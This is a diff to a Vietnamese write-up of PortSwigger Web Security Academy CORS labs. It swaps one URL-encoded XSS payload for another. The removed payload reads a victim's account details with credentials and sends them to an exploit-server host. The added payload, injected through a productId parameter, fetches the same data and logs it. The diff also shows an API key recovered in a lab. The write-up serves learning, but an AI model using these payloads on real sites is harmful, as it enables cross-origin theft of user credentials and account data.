@@ -47,7 +47,8 @@ Do thẻ iframe có thuộc tính `src="data:text/html,....`, Origin sẽ tự �
 Tiến hành URL decode, ta thu được `apikey=n2daOK1lnvFCmG9DwadLa7iTt1vZieUi`. Submit thông tin có được, kết quả thành công.
 
 # 3. CORS vulnerability with trusted insecure protocols
-
-%3Cscript%3Elet%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%20%3D%20printResponse%3Bxhr.open%28%27GET%27%2C%20%27https%3A%2F%2F0af4007804f8391dc0d57751008800c4.web-security-academy.net%2FaccountDetails%27%29%3Bxhr.withCredentials%20%3D%20true%3Bxhr.send%28%29%3Bfunction%20printResponse%28%29%7B%20%20%20%20document.location%20%3D%20%27https%3A%2F%2Fexploit-0a9a005e04143974c0e176c101cf0087.exploit-server.net%2F%3Fkey%3D%27%2BencodeURIComponent%28this.responseText%29%3B%7D%3C%2Fscript%3E
+<script>
+document.location="https://stock.0af4007804f8391dc0d57751008800c4.web-security-academy.net/?productId=%3Cscript%3Elet%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%20%3D%20printResponse%3Bxhr.open%28%27GET%27%2C%20%27https%3A%2F%2F0af4007804f8391dc0d57751008800c4.web-security-academy.net%2FaccountDetails%27%29%3Bxhr.withCredentials%20%3D%20true%3Bxhr.send%28%29%3Bfunction%20printResponse%28%29%7B%20%20%20%20console.log%28encodeURIComponent%28this.responseText%29%29%3B%7D%3C%2Fscript%3E&storeId=1"
+</script>
 
 # 4. CORS vulnerability with internal network pivot attackCORS vulnerability with internal network pivot attack
